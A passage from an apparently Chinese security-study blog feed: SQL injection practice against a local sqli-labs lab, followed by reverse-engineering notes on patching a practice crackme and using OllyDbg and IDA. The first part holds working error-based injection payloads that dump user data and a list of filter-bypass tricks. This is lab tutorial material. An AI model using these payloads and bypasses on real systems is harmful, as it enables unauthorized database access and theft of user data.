src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107223033963.png" alt="image-20240107223033963"></p><p>查字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-5/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&quot;users&quot; limit 11,1),floor(rand()*2)) as a from information_schema.tables  group by a -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107223059153.png" alt="image-20240107223059153"></p><p>查值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-5/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,count(*),concat((select username from security.users limit 0,1),floor(rand()*2)) as a from information_schema.tables  group by a -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107223125293.png" alt="image-20240107223125293"></p></li></ul><h1 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h1><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/    %23=<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h6 id="1-使用注释符-绕过"><a href="#1-使用注释符-绕过" class="headerlink" title="1.使用注释符/**/绕过"></a>1.使用注释符<code>/**/</code>绕过</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT/**/name/**/FROM/**/table<br></code></pre></td></tr></table></figure><h6 id="2-使用url编码绕过"><a href="#2-使用url编码绕过" class="headerlink" title="2.使用url编码绕过"></a>2.使用url编码绕过</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">%a0 发出去就是空格的意思，但是需要在burp中抓包后修改<br></code></pre></td></tr></table></figure><h6 id="3-使用浮点数绕过"><a href="#3-使用浮点数绕过" class="headerlink" title="3.使用浮点数绕过"></a>3.使用浮点数绕过</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">select * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=8E0union select 1,2,3<br>等价<br>select * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=8.0 select 1,2,3<br></code></pre></td></tr></table></figure><h6 id="4-使用Tab替代空格"><a href="#4-使用Tab替代空格" class="headerlink" title="4.使用Tab替代空格"></a>4.使用Tab替代空格</h6><h6 id="5-使用两个空格替代一个空格"><a href="#5-使用两个空格替代一个空格" class="headerlink" title="5.使用两个空格替代一个空格"></a>5.使用两个空格替代一个空格</h6><h6 id="6-使用括号绕过"><a href="#6-使用括号绕过" class="headerlink" title="6.使用括号绕过"></a>6.使用括号绕过</h6><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">select(user())from dual <span class="hljs-built_in">where</span>(1=1)and(2=2)<br></code></pre></td></tr></table></figure><h6 id="7-过滤引号"><a href="#7-过滤引号" class="headerlink" title="7.过滤引号"></a>7.过滤引号</h6><p>使用16进制绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">select column_name  from information_schema.tables <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&quot;users&quot;</span><br>等价于<br>select column_name  from information_schema.tables <span class="hljs-built_in">where</span> table_name=0x7573657273<br></code></pre></td></tr></table></figure><h6 id="8-过滤逗号"><a href="#8-过滤逗号" class="headerlink" title="8.过滤逗号"></a>8.过滤逗号</h6><p>使用from关键字绕过</p><p>对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">select substr(database() from 1 <span class="hljs-keyword">for</span> 1);<br>select mid(database() from 1 <span class="hljs-keyword">for</span> 1);<br></code></pre></td></tr></table></figure><p>使用join关键字绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">union select 1,2等价于union select * from (select 1)a <span class="hljs-built_in">join</span> (select 2)b<br></code></pre></td></tr></table></figure><p>使用like关键字绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">select ascii(mid(user(),1,1))=80   <br>等价<br>select user() like <span class="hljs-string">&#x27;r%&#x27;</span><br></code></pre></td></tr></table></figure><p>使用offset关键字绕过</p><p>对于limit可以使用offset来绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">select * from news <span class="hljs-built_in">limit</span> 0,1<br>等价于<br>select * from news <span class="hljs-built_in">limit</span> 1 offset 0<br></code></pre></td></tr></table></figure><h6 id="9-过滤注释符（-和-）"><a href="#9-过滤注释符（-和-）" class="headerlink" title="9.过滤注释符（ # 和 -- ）"></a>9.过滤注释符（ <code>#</code> 和 <code>--</code> ）</h6><p>手动闭合引号不用注释</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; union select 1,2,3||&#x27;</span>1<br>or<br><span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27; union select 1,2,&#x27;</span>3<br></code></pre></td></tr></table></figure><h6 id="10-过滤比较符号-（-lt-和-gt-）"><a href="#10-过滤比较符号-（-lt-和-gt-）" class="headerlink" title="10.过滤比较符号 （ &lt; 和 &gt; ）"></a>10.过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">select * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=1 and ascii(substr(database(),0,1))&gt;64<br><br>between a and b：返回a，b之间的数据，不包含b。<br></code></pre></td></tr></table></figure><h6 id="11-过滤等号（-）"><a href="#11-过滤等号（-）" class="headerlink" title="11.过滤等号（ = ）"></a>11.过滤等号（ <code>=</code> ）</h6><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><p>过滤or and xor not使用符号代替</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">and=`&amp;&amp;`  or=`||`   xor=`|`   not=`!`<br></code></pre></td></tr></table></figure><p>过滤union，select，where等<br>使用注释符绕过常用注释符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 、--、`/**/`、`<span class="hljs-comment">#`、`--+`、`---`、`;`、`%00`、`--a</span><br></code></pre></td></tr></table></figure><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">U/**/ NION /**/ SE/**/ LECT /**/user，<span class="hljs-built_in">pwd</span> from user<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向学习笔记三</title>
    <link href="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <url>/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="分析cbex-crackme-1"><a href="#分析cbex-crackme-1" class="headerlink" title="分析cbex crackme#1"></a>分析cbex crackme#1</h2><p>crackme就是“破解我”的意思，它们都是一些公开用作破解练习的小程序<br>下载地址：<a href="https://github.com/idea-oss/example-/tree/main/01/06/bin">https://github.com/idea-oss/example-/tree/main/01/06/bin</a></p><ul><li><p><strong>运行程序</strong><br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/image-20240107213728151.png" alt="image-20240107213728151"><br>点击确定后，然后几出错了<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/image-20240107213741085.png" alt="image-20240107213741085"></p></li><li><p><strong>用od打开调试</strong><br>用之前的方法找到入口函数<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/image-20240107213753474.png" alt="image-20240107213753474"></p></li><li><p><strong>代码分析</strong></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#这里是给messagebox()函数传参，并调用</span><br>PUSH 0                                   ; /Style = MB_OK|MB_APPLMODAL<br>PUSH abexcm1-.00402000                   ; |Title = <span class="hljs-string">&quot;abex&#x27; 1st crackme&quot;</span><br>PUSH abexcm1-.00402012                   ; |Text = <span class="hljs-string">&quot;Make me think your HD is a CD-Rom.&quot;</span><br>PUSH 0                                   ; |hOwner = NULL<br>CALL &lt;JMP.&amp;USER32.MessageBoxA&gt;           ; \MessageBoxA<br><span class="hljs-comment">#给getdrivetype()函数传参并调用，getdrivetype(） api，获取c驱动的类型(大部分返回的是HDD类型)</span><br>PUSH abexcm1-.00402094                   ; /RootPathName = <span class="hljs-string">&quot;c:\&quot;</span><br><span class="hljs-string">CALL &lt;JMP.&amp;KERNEL32.GetDriveTypeA&gt;       ; \GetDriveTypeA 返回值(eax)是三(drive_fixed)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">INC ESI ;inc esi为自加一操作，esi的值为0</span><br><span class="hljs-string">DEC EAX;dec为自减一操作，所以eax变成了2</span><br><span class="hljs-string">JMP SHORT abexcm1-.00401021;无用操作，就是跳到下一行代码处</span><br><span class="hljs-string">INC ESI</span><br><span class="hljs-string">INC ESI</span><br><span class="hljs-string">DEC EAX</span><br><span class="hljs-string">CMP EAX,ESI;比较eax,esi</span><br><span class="hljs-string">JE SHORT abexcm1-.0040103D;若上面比较的值相等就跳转40103D，否则就向下执行命令</span><br><span class="hljs-string">PUSH 0                                   ; /Style = MB_OK|MB_APPLMODAL</span><br><span class="hljs-string">PUSH abexcm1-.00402035                   ; |Title = &quot;</span>Error<span class="hljs-string">&quot;</span><br><span class="hljs-string">PUSH abexcm1-.0040203B                   ; |Text = &quot;</span>Nah... This is not a CD-ROM Drive!<span class="hljs-string">&quot;</span><br><span class="hljs-string">PUSH 0                                   ; |hOwner = NULL</span><br><span class="hljs-string">CALL &lt;JMP.&amp;USER32.MessageBoxA&gt;           ; \MessageBoxA</span><br><span class="hljs-string">JMP SHORT abexcm1-.00401050</span><br><span class="hljs-string">PUSH 0                                   ; |/Style = MB_OK|MB_APPLMODAL</span><br><span class="hljs-string">PUSH abexcm1-.0040205E                   ; ||Title = &quot;</span>YEAH!<span class="hljs-string">&quot;</span><br><span class="hljs-string">PUSH abexcm1-.00402064                   ; ||Text = &quot;</span>Ok, I really think that your HD is a CD-ROM! :p<span class="hljs-string">&quot;</span><br><span class="hljs-string">PUSH 0                                   ; ||hOwner = NULL</span><br><span class="hljs-string">CALL &lt;JMP.&amp;USER32.MessageBoxA&gt;           ; |\MessageBoxA</span><br><span class="hljs-string">CALL &lt;JMP.&amp;KERNEL32.ExitProcess&gt;         ; \ExitProcess</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>push</td><td>入栈操作</td></tr><tr><td>call</td><td>调用指定位置的函数</td></tr><tr><td>inc</td><td>值加1</td></tr><tr><td>dec</td><td>值减1</td></tr><tr><td>jmp</td><td>跳转到指定地址</td></tr><tr><td>cmp</td><td>比较给定的两个操作数与sub命令类似，但是操作数的值不会改变，仅改变eflags寄存器(若两个操作数的值一致,sub结果为0，zf被置为1)</td></tr><tr><td>je</td><td>条件跳转指令(jump if equal) 若zf为1，则跳转</td></tr></tbody></table><ul><li><strong>破解</strong><br>在如下位置，按空格<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/image-20240107213807122.png" alt="image-20240107213807122"><br>将JE条件跳转指令改成JMP无条件跳转即可<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/image-20240107213820900.png" alt="image-20240107213820900"><br>copy to executable<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/image-20240107213832911.png" alt="image-20240107213832911"><br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/image-20240107213844854.png" alt="image-20240107213844854"><br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/image-20240107213900358.png" alt="image-20240107213900358"><br>然后运行修改后的程序</li></ul><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/image-20240107213917444.png" alt="image-20240107213917444"><br>破解成功</p><h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><p>栈帧在程序中用于声明局部变量、调用函数。栈帧就是利用EBP(栈帧指针，请注意不是ESP)寄存器访问栈内部局部变量、参数函数返回地址等手段ESP承担着栈顶指针的作用，而EBP寄存器则负责行使栈帧指针的职能。程序运行中，ESP寄存器的值随时变化，访问栈中函数的局部变量、参数时，若以ESP值为基准编写程序会十分困难，并且也很难使CPU引用到准确的地址。所以，调用某函数时，先要把用作基准点(函数起始地址)的ESP值保存到EBP并维持在函数内部。这样，无论ESP的值如何变化，以EBP的值为基准能够安全访问到相关函数的局部变量、参数、返回地址，这就是EBP寄存器作为栈帧指针的作用</p><p>栈帧对应的汇编代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">push ebp;函数开始，使用ebp前先把已有的值保存到栈中<br>mov ebp,esp;保存当前esp到ebp中<br>......<br>mov esp,ebp;将函数的起始地址返回到esp中<br>pop ebp;函数返回前弹出保存在栈中的ebp值<br>retn;函数终止<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向学习笔记二</title>
    <link href="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <url>/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="一：OD操作基础"><a href="#一：OD操作基础" class="headerlink" title="一：OD操作基础"></a>一：OD操作基础</h2><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107164200272.png" alt="image-20240107164200272"></p><h4 id="1-1窗口界面"><a href="#1-1窗口界面" class="headerlink" title="1.1窗口界面"></a>1.1窗口界面</h4><ul><li><h6 id="窗口组成"><a href="#窗口组成" class="headerlink" title="窗口组成"></a>窗口组成</h6><p>该窗口界面（CPU）由下图所示的5个子窗口组成</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107224709658.png" alt="image-20240107224709658"></p></li><li><h6 id="窗口功能"><a href="#窗口功能" class="headerlink" title="窗口功能"></a>窗口功能</h6><p> 反汇编窗口：显示被调试程序的反汇编代码，包括地址栏、HEX数据栏（机器码）、汇编指令               栏、注释栏。</p><p> 寄存器窗口：显示CPU各个寄存器的值。</p><p> 信息窗口：显示与指令相关的各寄存器的值、API函数调用提示和跳转提示等信息。</p><p> 数据窗口：显示内存数据，包括地址栏、十六进制数据栏、ASCII栏。</p><p> 堆栈窗口：显示当前线程的堆栈。</p></li></ul><h4 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#F2：设置或取消设置断点</span><br><br><span class="hljs-comment">#F3：加载一个可执行程序，进行分析调试</span><br><br><span class="hljs-comment">#F4：程序执行到光标处</span><br><br><span class="hljs-comment">#F7：单步步入，遇到call指令跟进</span><br><br><span class="hljs-comment">#F8：单步步过，遇到call指令不跟进</span><br><br><span class="hljs-comment">#F9：运行程序到断点处</span><br><br><span class="hljs-comment">#Ctrl+F2：重新执行程序到起始处</span><br><br><span class="hljs-comment">#Ctrl+F9：执行到函数返回</span><br><br><span class="hljs-comment">#Ctrl+E：编辑内存内容</span><br><br><span class="hljs-comment">#Ctrl+G：输入地址，进行定位</span><br><br><span class="hljs-comment">#Alt+F9：执行到用户代码</span><br></code></pre></td></tr></table></figure><ul><li><strong>goto语句</strong><br>跳转到指定位置去，执行Go to(Ctrl + G) 命<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107164410490.png" alt="image-20240107164410490"><strong>设置断点</strong><br>设置BP(Break Point,断点)(快捷键F2)<br>设置断点后，调试运行到断点处将会暂停(若未在代码中设置断点则继续调试)。<br>在OD菜单栏中依次选中View-Breakpoints选项(快捷键 ALT+B),打开Breakpoints对话框，列出代码中设置的断点</li><li><strong>注释</strong><br>按键盘上的”;”可以在指定地址处添加注释</li><li><strong>标签</strong><br>我们可以通过标签提供的功能在指定地址添加特定名称。移动光标到指定地址处，按”:”键输入标签</li></ul><h2 id="二：快速查找指定代码方法"><a href="#二：快速查找指定代码方法" class="headerlink" title="二：快速查找指定代码方法"></a>二：快速查找指定代码方法</h2><p>调试代码时，main()函数并不直接位于可执行文件的EP位置上，出现在此的时开发工具(Visual c++)生成的启动函数。我们需要查看的main()函数距离EP代码很远，快速找到main()函数有四种</p><ul><li><strong>代码执行法</strong><br>适用于量不大，且程序功能明确的情况</li><li><strong>字符串检索法</strong><br>鼠标右键菜单–search for –all referenced text strings<br>在OD的Dump窗口中使用Go to(Ctrl+G)命令，可以进一步查看位于内存某处的字符串。首先使用鼠标点击dump窗口，然后按Ctrl+G快捷键，打开Enter expression to follow in Dump窗口。<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107164454025.png" alt="image-20240107164454025"><br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107164503713.png" alt="image-20240107164503713"><strong>API检索法：在调用代码中设置断点</strong><br>鼠标右键菜单–Search for –all intermodular calls(所有模块间的调用)<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107164542436.png" alt="image-20240107164542436"></li><li><strong>API检索法：再API代码中设置断点</strong><br>鼠标右键菜单–Search for—Name in all calls（“所有模块中的名称”并敲下MessageBox,光标会直接定位到messagebox那去）<br>OD并不能为所有可执行文件都列出API函数列表。使用压缩器&#x2F;保护器工具对可执行文件进行压缩保护之后，文件结构就会改变，此时OD就无法列出API调用列表了(甚至连调试都会变得非常麻烦)<br><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107164554855.png" alt="image-20240107164554855"><br>在OD中选择View-Memory菜单(快捷键Alt+M),打开内存映射窗口。</li></ul><h2 id="三：IDA"><a href="#三：IDA" class="headerlink" title="三：IDA"></a>三：IDA</h2><ul><li><h4 id="IDA目录结构"><a href="#IDA目录结构" class="headerlink" title="IDA目录结构"></a>IDA目录结构</h4></li></ul><p>在IDA的安装根目录下有许多文件夹，各个文件夹存储不同的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">cfg：包含各种配置文件，基本IDA配置文件ida.cfg,GUI配置文件idagui.cfg，文本模式用户界面配置文件idatui.cfg,<br>idc：包含IDA内置脚本语言IDC所需要的核心文件<br>ids：包含一些符号文件<br>loaders：包含用于识别和解析PE或者ELF<br>plugins：附加的插件模块<br>procs：包含处理器模块<br></code></pre></td></tr></table></figure><ul><li><h4 id="常用快捷键-1"><a href="#常用快捷键-1" class="headerlink" title="常用快捷键"></a>常用快捷键</h4><p>IDA中的快捷键都是和菜单栏的各个功能选项一一对应的，基本上你只要能在菜单栏上找到某个功能，也就能看到相应的快捷键，这里记录几个常用的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">a：将数据转换为字符串<br>R：转化成字符<br>f5：一键反汇编<br><br>esc：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下esc，会关闭该窗口）<br><br><span class="hljs-built_in">shift</span>+f12：可以打开string窗口，一键找出所有的字符串，右击setup，还能对窗口的属性进行设置<br><br>ctrl+w：保存ida数据库<br><br>ctrl+s：选择某个数据段，直接进行跳转<br><br>ctrl+鼠标滚轮：能够调节流程视图的大小<br><br>x：对着某个函数、变量按该快捷键，可以查看它的交叉引用<br><br>g：直接跳转到某个地址<br><br>n：更改变量的名称<br><br>y：更改变量的类型<br><br>/ ：在反编译后伪代码的界面中写下注释<br><br>\：在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多<br><br>；：在反汇编后的界面中写下注释<br><br>ctrl+<span class="hljs-built_in">shift</span>+w：拍摄IDA快照<br><br>u：undefine，取消定义函数、代码、数据的定义<br></code></pre></td></tr></table></figure></li><li><h4 id="ida修改指令"><a href="#ida修改指令" class="headerlink" title="ida修改指令"></a>ida修改指令</h4><p>1.指向修改的地方 选择如下</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107230251675.png" alt="image-20240107230251675"></p><p>2.修改指令后 将其输入应用到文件即可</p><p><img src="/2022/06/20/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/image-20240107230314250.png" alt="image-20240107230314250"></p></li><li><h4 id="拍摄快照"><a href="#拍摄快照" class="headerlink" title="拍摄快照"></a>拍摄快照</h4><p>由于IDA不提供撤销的功能，如果你不小心按到某个键，导致ida数据库发生了改变，就得重新来过，所以要记得在经常操作的时候，加上快照：file–&gt;take database snapshot<br>加完快照后，会生成一个新的ida数据库文件，本质上是有点像另存的操作</p><p>快捷键：ctrl+shift+w</p></li><li><h4 id="菜单栏常用设置"><a 